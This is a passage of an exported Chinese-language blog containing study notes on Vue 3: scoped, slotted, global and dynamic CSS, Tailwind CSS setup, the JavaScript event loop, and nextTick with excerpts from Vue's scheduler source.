function_">join</span>(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// shorthand</span></span><br><span class="line">          <span class="keyword">if</span> (animationRE.<span class="title function_">test</span>(decl.<span class="property">prop</span>)) &#123;</span><br><span class="line">            decl.<span class="property">value</span> = decl.<span class="property">value</span></span><br><span class="line">              .<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">              .<span class="title function_">map</span>(<span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> vals = v.<span class="title function_">trim</span>().<span class="title function_">split</span>(<span class="regexp">/\s+/</span>)</span><br><span class="line">                <span class="keyword">const</span> i = vals.<span class="title function_">findIndex</span>(<span class="function"><span class="params">val</span> =&gt;</span> keyframes[val])</span><br><span class="line">                <span class="keyword">if</span> (i !== -<span class="number">1</span>) &#123;</span><br><span class="line">                  vals.<span class="title function_">splice</span>(i, <span class="number">1</span>, keyframes[vals[i]])</span><br><span class="line">                  <span class="keyword">return</span> vals.<span class="title function_">join</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="keyword">return</span> v</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;)</span><br><span class="line">              .<span class="title function_">join</span>(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 做缓存，如果已经有这个rule（一个AST）就不操作了</span></span><br><span class="line"><span class="keyword">const</span> processedRules = <span class="keyword">new</span> <span class="title class_">WeakSet</span>&lt;<span class="title class_">Rule</span>&gt;()</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">processRule</span>(<span class="params">id: <span class="built_in">string</span>, rule: Rule</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    processedRules.<span class="title function_">has</span>(rule) ||</span><br><span class="line">    (rule.<span class="property">parent</span> &amp;&amp;</span><br><span class="line">      rule.<span class="property">parent</span>.<span class="property">type</span> === <span class="string">&#x27;atrule&#x27;</span> &amp;&amp;</span><br><span class="line">      <span class="regexp">/-?keyframes$/</span>.<span class="title function_">test</span>((rule.<span class="property">parent</span> <span class="keyword">as</span> <span class="title class_">AtRule</span>).<span class="property">name</span>))</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">  processedRules.<span class="title function_">add</span>(rule)</span><br><span class="line">  <span class="comment">// 遍历AST节点</span></span><br><span class="line">  rule.<span class="property">selector</span> = <span class="title function_">selectorParser</span>(<span class="function"><span class="params">selectorRoot</span> =&gt;</span> &#123;</span><br><span class="line">    selectorRoot.<span class="title function_">each</span>(<span class="function"><span class="params">selector</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">rewriteSelector</span>(id, selector, selectorRoot)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;).<span class="title function_">processSync</span>(rule.<span class="property">selector</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue Style</title>
    <url>/web/study/Vue/33.Vue%20Style.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="插槽选择器"><a href="#插槽选择器" class="headerlink" title="插槽选择器"></a>插槽选择器</h1><p>选择插槽内的元素。</p>
<p>A.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    我是插槽</span><br><span class="line">    &lt;slot&gt;&lt;/slot&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">// 这样做不会生效，因为vue会将a理解为父级的类名</span><br><span class="line">// .a &#123;</span><br><span class="line">//   color: red;</span><br><span class="line">// &#125;</span><br><span class="line">// 插槽选择器，vue会认为a是子组件的类名，这样就能生效了</span><br><span class="line">:slotted(.a) &#123;</span><br><span class="line">  color: red;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;A&gt;</span><br><span class="line">    &lt;div class=&quot;a&quot;&gt;插入&lt;/div&gt;</span><br><span class="line">  &lt;/A&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import A from &#x27;@/components/A.vue&#x27;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="全局选择器"><a href="#全局选择器" class="headerlink" title="全局选择器"></a>全局选择器</h1><p>在全局选择元素（不限作用域）。</p>
<p>A.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    我是插槽</span><br><span class="line">    &lt;slot&gt;&lt;/slot&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">// 也可以用全局选择器</span><br><span class="line">:global(.a) &#123;</span><br><span class="line">  color: red;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot;&gt;</span><br><span class="line">// 可以直接开一个新的style，不加scoped，就可以作用于全局</span><br><span class="line">// .a &#123;</span><br><span class="line">//   color: red;</span><br><span class="line">// &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h1 id="动态CSS"><a href="#动态CSS" class="headerlink" title="动态CSS"></a>动态CSS</h1><p>可以通过JS变量控制CSS。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;div1&quot;&gt;</span><br><span class="line">    动态CSS1</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;div class=&quot;div2&quot;&gt;</span><br><span class="line">    动态CSS2</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">const style1 = ref(&quot;red&quot;)</span><br><span class="line">const style2 = ref(&#123;</span><br><span class="line">  color:&#x27;red&#x27;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// 可以通过js控制样式</span><br><span class="line">setTimeout(() =&gt; &#123;</span><br><span class="line">  style1.value = &quot;blue&quot;</span><br><span class="line">  style2.value.color = &quot;blue&quot;</span><br><span class="line">&#125;, 2000)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.div1 &#123;</span><br><span class="line">  color: v-bind(style1)</span><br><span class="line">&#125;</span><br><span class="line">.div2 &#123;</span><br><span class="line">  // 不能直接读取对象属性，会报错，需要加引号</span><br><span class="line">  color: v-bind(&quot;style2.color&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>也可以将Style标签作为模块使用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- 如果没有给style模块标签命名就这么写 --&gt;</span><br><span class="line">  &lt;!-- &lt;div :class=&quot;[$style.div,$style.border]&quot;&gt; --&gt;</span><br><span class="line">  &lt;!-- 如果给style模块标签命了名就这么写 --&gt;</span><br><span class="line">  &lt;div :class=&quot;[cssss.div,cssss.border]&quot;&gt;</span><br><span class="line">    动态CSS</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">const css = useCssModule(&quot;cssss&quot;)</span><br><span class="line">// 可以读到实际生成的类名</span><br><span class="line">console.log(css)</span><br><span class="line">// 常用于tsx或render函数</span><br><span class="line">// return(&lt;div class=&#123;cssss.div&#125;&gt;&lt;/div&gt;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style module=&quot;cssss&quot; lang=&quot;scss&quot;&gt;</span><br><span class="line">.div &#123;</span><br><span class="line">  color: red</span><br><span class="line">&#125;</span><br><span class="line">.border &#123;</span><br><span class="line">  border: 1px solid #ccc;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3集成Tailwind CSS</title>
    <url>/web/study/Vue/34.Vue3%E9%9B%86%E6%88%90Tailwind%20CSS.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="Tailwind-CSS"><a href="#Tailwind-CSS" class="headerlink" title="Tailwind CSS"></a>Tailwind CSS</h1><p><a href="https://www.tailwindcss.cn/">Tailwind CSS</a>是由JS编写的CSS框架，基于PostCSS解析。</p>
<ul>
<li>通过一套约束系统保证一致性，避免随意的取值。</li>
<li>因为抽象层级较低，所以可定制性强。</li>
<li>在生产环境中会进行Tree Shake，自动删除未使用的CSS。</li>
<li>简化响应式设计。</li>
<li>简化互动设计，例如鼠标悬停或焦点状态。</li>
<li>支持在自定义类中组合Tailwind工具类使用。</li>
<li>支持夜间模式。</li>
<li>支持自定义工具类。</li>
<li>跟进前沿CSS技术。</li>
</ul>
<h1 id="PostCSS"><a href="#PostCSS" class="headerlink" title="PostCSS"></a>PostCSS</h1><p><a href="https://www.postcss.com.cn/">PostCSS</a>是一个用JS转换CSS代码的工具。</p>
<ul>
<li>增强代码的可读性，利用<a href="https://caniuse.com/">Can I use</a>网站的数据自动添加厂商前缀。</li>
<li>将最新前沿CSS语法转换为兼容性好的语法。</li>
<li>终结全局CSS</li>
<li>使用Stylelint检查代码，避免错误。</li>
</ul>
<h1 id="PostCSS解析Tailwind-CSS"><a href="#PostCSS解析Tailwind-CSS" class="headerlink" title="PostCSS解析Tailwind CSS"></a>PostCSS解析Tailwind CSS</h1><ol>
<li>将CSS解析成抽象语法树（AST）</li>
<li>读取插件配置，根据配置文件生成新的AST</li>
<li>将AST传递给一系列数据转化操作处理（变量数据循环生成、嵌套类名循环等）</li>
<li>清除一系列操作留下的数据痕迹</li>
<li>将处理完毕的AST重新转换成字符串</li>
</ol>
<h1 id="Vue3集成Tailwind-CSS"><a href="#Vue3集成Tailwind-CSS" class="headerlink" title="Vue3集成Tailwind CSS"></a>Vue3集成Tailwind CSS</h1><ol>
<li><p>初始化项目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm init vue@latest</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装 Tailwind 以及其它依赖项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -D tailwindcss@latest postcss@latest autoprefixer@latest</span><br></pre></td></tr></table></figure>
</li>
<li><p>生成配置文件（<a href="https://www.tailwindcss.cn/docs/configuration">Tailwind CSS配置</a>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npx tailwindcss init -p</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改配置文件 tailwind.config.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** <span class="doctag">@type</span> &#123;<span class="type">import(&#x27;tailwindcss&#x27;).Config</span>&#125; */</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">content</span>: [<span class="string">&quot;./index.html&quot;</span>,<span class="string">&quot;./src/**/*.&#123;vue,js,ts,jsx,tsx&#125;&quot;</span>],</span><br><span class="line">  <span class="attr">theme</span>: &#123;</span><br><span class="line">    <span class="attr">extend</span>: &#123;&#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">plugins</span>: [],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建index.css</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@tailwind base;</span><br><span class="line">@tailwind components;</span><br><span class="line">@tailwind utilities;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在main.ts中引入index.css</p>
</li>
<li><p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;max-w-md mx-auto bg-white rounded-xl shadow-md overflow-hidden md:max-w-2xl&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;md:flex&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;md:flex-shrink-0&quot;&gt;</span><br><span class="line">        &lt;img class=&quot;h-48 w-full object-cover md:w-48&quot; src=&quot;https://image.cheriko.fun/music/202304301615221.jpg&quot; alt=&quot;Man looking at item at a store&quot;&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;p-8&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;uppercase tracking-wide text-sm text-indigo-500 font-semibold&quot;&gt;Lorem ipsum&lt;/div&gt;</span><br><span class="line">        &lt;a href=&quot;#&quot; class=&quot;block mt-1 text-lg leading-tight font-medium text-black hover:underline&quot;&gt;dolor sit, amet consectetur adipisicing elit.&lt;/a&gt;</span><br><span class="line">        &lt;p class=&quot;mt-2 text-gray-500&quot;&gt;Iusto, quae! Pariatur mollitia nulla ipsa. Velit, totam!&lt;/p&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">      </span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>VS Code可以安装Tailwind CSS IntelliSense扩展获取代码提示。</p>
</blockquote>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Event Loop和nextTick</title>
    <url>/web/study/Vue/35.Event%20Loop%E5%92%8CnextTick.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="Event-Loop"><a href="#Event-Loop" class="headerlink" title="Event Loop"></a>Event Loop</h1><h2 id="JavaScript单线程"><a href="#JavaScript单线程" class="headerlink" title="JavaScript单线程"></a>JavaScript单线程</h2><p>JavaScript被设计成单线程，主要的原因还是在于操作DOM ，包括在异步的事件处理器中操作DOM。</p>
<p>如果JS是多线程，那么操作DOM必然会涉及资源的竞争，这款语言就必然被实现的非常臃肿，在客户端中跑这样的程序，资源消耗和性能都将是不乐观的，同时在客户端也没有实现多线程的刚需。</p>
<p>如果设计成单线程，并辅以完善的异步队列来实现，那么运行成本就会比多线程小很多了。</p>
<p>随着HTML5的到来，JavaScript也开始支持多线程webWorker，但它不能操作DOM。</p>
<h2 id="JavaScript异步"><a href="#JavaScript异步" class="headerlink" title="JavaScript异步"></a>JavaScript异步</h2><p>单线程就意味着所有的任务都需要排队，后面的任务需要等前面的任务执行完才能执行。</p>
<p>如果前面的任务耗时过长，后面的任务就需要一直等，一些从用户角度上不需要等待的任务就会一直排队。</p>
<p>这从用户体验角度上是不可接受的，所以JavaScript就有了异步。</p>
<h3 id="同步任务"><a href="#同步任务" class="headerlink" title="同步任务"></a>同步任务</h3><p>代码从上到下按顺序执行。</p>
<h3 id="异步任务"><a href="#异步任务" class="headerlink" title="异步任务"></a>异步任务</h3><h4 id="宏任务"><a href="#宏任务" class="headerlink" title="宏任务"></a>宏任务</h4><p>script（整体代码）、setTimeout、setInterval、UI交互事件、postMessage、Ajax</p>
<h4 id="微任务"><a href="#微任务" class="headerlink" title="微任务"></a>微任务</h4><p>Promise.then.catch.finally、MutationObserver、process.nextTice（Node.js环境）</p>
<h3 id="运行机制"><a href="#运行机制" class="headerlink" title="运行机制"></a>运行机制</h3><p>所有的同步任务都是在主进程执行的，形成了一个执行栈。</p>
<p>主线程之外，还存在一个“任务队列”。异步任务执行队列中，先执行宏任务，然后清空当次宏任务中的所有微任务，然后进行下一个tick，如此形成循环。</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305282104387.png" alt="运行机制"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">Prom</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Y&quot;</span>)</span><br><span class="line">  <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>()</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;X&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)</span><br><span class="line">  <span class="title class_">Promise</span>.<span class="title function_">resolve</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">3</span>)</span><br><span class="line">  <span class="title class_">Promise</span>.<span class="title function_">resolve</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">4</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;, <span class="number">0</span>)</span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">resolve</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">resolve</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">6</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">resolve</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">7</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">resolve</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">8</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="title class_">Prom</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">0</span>)</span><br><span class="line"><span class="comment">// 执行顺序：Y 0 5 6 7 8 X 1 2 3 4</span></span><br></pre></td></tr></table></figure>

<h1 id="nextTick"><a href="#nextTick" class="headerlink" title="nextTick"></a>nextTick</h1><p>创建一个异步任务，它要等到同步任务执行完成后才执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div ref=&quot;box&quot; class=&quot;wraps&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;div class=&quot;item&quot; v-for=&quot;(item,index) in chatList&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">        &lt;div&gt;&#123;&#123; item.name &#125;&#125;&lt;/div&gt;</span><br><span class="line">        &lt;div&gt;&#123;&#123; item.message &#125;&#125;&lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;div class=&quot;ipt&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;textarea v-model=&quot;ipt&quot; type=&quot;text&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;button @click=&quot;send&quot;&gt;send&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">const chatList = reactive([</span><br><span class="line">  &#123;name:&quot;张三&quot;,message:&quot;xxxxxxxxxx&quot;&#125;,</span><br><span class="line">])</span><br><span class="line">const box = ref&lt;HTMLDivElement&gt;()</span><br><span class="line">const ipt = ref(&quot;&quot;)</span><br><span class="line">const send = async ()=&gt; &#123;</span><br><span class="line">  if(ipt.value === &quot;&quot;) return</span><br><span class="line">  chatList.push(&#123;name:&quot;李四&quot;,message:ipt.value&#125;)</span><br><span class="line">  // 直接操作DOM的滚动高度，有时好使有时不好使</span><br><span class="line">  // box.value!.scrollTop = 1145141919</span><br><span class="line">  // Vue更新DOM是异步的，更新数据是同步的</span><br><span class="line">  // 此处执行的都是同步代码，走完才去更新DOM</span><br><span class="line">  // 造成了先开始滚动，还没滚完就被插入DOM，于是滚动高度混乱的情况</span><br><span class="line"></span><br><span class="line">  // 1.回调函数模式</span><br><span class="line">  // nextTick(()=&gt; &#123;</span><br><span class="line">  //   box.value!.scrollTop = 1145141919</span><br><span class="line">  // &#125;)</span><br><span class="line"></span><br><span class="line">  // 2.async await写法（从此之后的代码都是异步的啦）</span><br><span class="line">  await nextTick()</span><br><span class="line">  box.value!.scrollTop = 1145141919</span><br><span class="line">  ipt.value = &quot;&quot;</span><br><span class="line"></span><br><span class="line">  // 当操作DOM时发现数据读取的还是上次的，就需要使用nextTick</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.wraps &#123;</span><br><span class="line">  margin: 10px auto;</span><br><span class="line">  width: 500px;</span><br><span class="line">  height: 400px;</span><br><span class="line">  overflow: auto;</span><br><span class="line">  overflow-x: hidden;</span><br><span class="line">  background-color: #fff;</span><br><span class="line">  border: 1px solid #ccc;</span><br><span class="line"></span><br><span class="line">  .item &#123;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 50px;</span><br><span class="line">    background-color: #ccc;</span><br><span class="line">    display: flex;</span><br><span class="line">    align-items: center;</span><br><span class="line">    padding: 0 10px;</span><br><span class="line">    border-bottom: 1px solid #fff;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">.ipt &#123;</span><br><span class="line">  margin: 10px auto;</span><br><span class="line">  width: 500px;</span><br><span class="line">  height: 40px;</span><br><span class="line">  background: #fff;</span><br><span class="line">  border: 1px solid #ccc;</span><br><span class="line"> </span><br><span class="line">  textarea &#123;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 100%;</span><br><span class="line">    border: none;</span><br><span class="line">    outline: none;</span><br><span class="line">  &#125;</span><br><span class="line">  button &#123;</span><br><span class="line">    width: 100px;</span><br><span class="line">    margin: 10px 0;</span><br><span class="line">    float: right;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>浏览器在一个tick里做了如下工作：</p>
<ol>
<li>处理用户的事件（event），例如click、input、change等</li>
<li>执行定时器任务</li>
<li>执行requestAnimationFrame</li>
<li>执行dom的回流与重绘</li>
<li>计算更新图层的绘制指令</li>
<li>绘制指令合并主线程 如果有空余时间会执行requestidlecallback</li>
</ol>
<p>如果DOM改变的操作是同步的，如果短时间内某响应式数据持续变化，DOM就会接连改变，消耗性能。如果是异步，下一个tick读取数据并改变DOM，就不会接连改变DOM。</p>
<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>在Vue源码（<code>/package/runtime-core/src/scheduler.ts</code>）中可以看到nextTick和异步DOM更新的源码。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="attr">queue</span>: <span class="title class_">SchedulerJob</span>[] = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> resolvedPromise = <span class="comment">/*#__PURE__*/</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>() <span class="keyword">as</span> <span class="title class_">Promise</span>&lt;<span class="built_in">any</span>&gt;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">currentFlushPromise</span>: <span class="title class_">Promise</span>&lt;<span class="built_in">void</span>&gt; | <span class="literal">null</span> = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过Promise.then()实现异步执行nextTick的回调函数</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> nextTick&lt;T = <span class="built_in">void</span>&gt;(</span><br><span class="line">  <span class="attr">this</span>: T,</span><br><span class="line">  fn?: <span class="function">(<span class="params"><span class="variable language_">this</span>: T</span>) =&gt;</span> <span class="built_in">void</span></span><br><span class="line">): <span class="title class_">Promise</span>&lt;<span class="built_in">void</span>&gt; &#123;</span><br><span class="line">  <span class="comment">// p是一个promise</span></span><br><span class="line">  <span class="keyword">const</span> p = currentFlushPromise || resolvedPromise</span><br><span class="line">  <span class="comment">// 把传入的函数放到.then()里执行，走了个微任务</span></span><br><span class="line">  <span class="keyword">return</span> fn ? p.<span class="title function_">then</span>(<span class="variable language_">this</span> ? fn.<span class="title function_">bind</span>(<span class="variable language_">this</span>) : fn) : p</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// nextTick的原理就是把函数放进Promise里执行，把代码变异步</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// job就是组件实例上的update方法（effect函数）</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">queueJob</span>(<span class="params">job: SchedulerJob</span>) &#123;</span><br><span class="line">  <span class="comment">// the dedupe search uses the startIndex argument of Array.includes()</span></span><br><span class="line">  <span class="comment">// by default the search index includes the current job that is being run</span></span><br><span class="line">  <span class="comment">// so it cannot recursively trigger itself again.</span></span><br><span class="line">  <span class="comment">// if the job is a watch() callback, the search will start with a +1 index to</span></span><br><span class="line">  <span class="comment">// allow it recursively trigger itself - it is the user&#x27;s responsibility to</span></span><br><span class="line">  <span class="comment">// ensure it doesn&#x27;t end up in an infinite loop.</span></span><br><span class="line">  <span class="comment">// 去重判断</span></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    !queue.<span class="property">length</span> ||</span><br><span class="line">    !queue.<span class="title function_">includes</span>(</span><br><span class="line">      job,</span><br><span class="line">      isFlushing &amp;&amp; job.<span class="property">allowRecurse</span> ? flushIndex + <span class="number">1</span> : flushIndex</span><br><span class="line">    )</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="keyword">if</span> (job.<span class="property">id</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">// 如果组件实例没有id，添加到队列尾部</span></span><br><span class="line">      queue.<span class="title function_">push</span>(job)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 按照id自增的顺序排列job</span></span><br><span class="line">      queue.<span class="title function_">splice</span>(<span class="title function_">findInsertionIndex</span>(job.<span class="property">id</span>), <span class="number">0</span>, job)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">queueFlush</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">queueFlush</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!isFlushing &amp;&amp; !isFlushPending) &#123;</span><br><span class="line">    isFlushPending = <span class="literal">true</span></span><br><span class="line">    <span class="comment">// 创建了一个promise微任务 把flushJobs放进去执行</span></span><br><span class="line">    currentFlushPromise = resolvedPromise.<span class="title function_">then</span>(flushJobs)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">flushJobs</span>(<span class="params">seen?: CountMap</span>) 